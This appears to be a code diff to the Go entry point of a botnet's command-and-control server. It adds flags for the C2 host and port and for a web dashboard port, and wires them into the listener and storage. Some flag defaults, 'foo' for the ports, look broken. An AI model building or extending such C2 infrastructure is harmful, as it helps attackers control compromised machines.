@@ -1,8 +1,8 @@
 package main
 
 import (
+	"flag"
 	"log"
-	"os"
 
 	"github.com/rodzzlessa24/botnet/tcp"
 
@@ -10,11 +10,19 @@ import (
 	"github.com/rodzzlessa24/botnet/sqlite"
 )
 
+var (
+	hostPtr    = flag.String("host", "127.0.0.1", "the host for the command and control")
+	portPtr    = flag.String("port", "foo", "the port for the command and control")
+	webPortPtr = flag.String("webport", "foo", "the port for the web dashboard")
+)
+
 func main() {
+	flag.Parse()
+
 	// Set the httpAddress
 	httpAddress := ":8000"
-	if os.Getenv("PORT") != "" {
-		httpAddress = ":" + os.Getenv("PORT")
+	if *webPortPtr != "" {
+		httpAddress = ":" + *webPortPtr
 	}
 
 	db, err := sqlite.Open("./cc.db")
@@ -24,8 +32,7 @@ func main() {
 	defer db.Close()
 	storage := &sqlite.Client{DB: db}
 
-	commander := tcp.NewCC()
-
+	commander := tcp.NewCC(*hostPtr, *portPtr, storage)
 	go commander.Listen()
 
 	h := http.NewHandler(commander, storage)
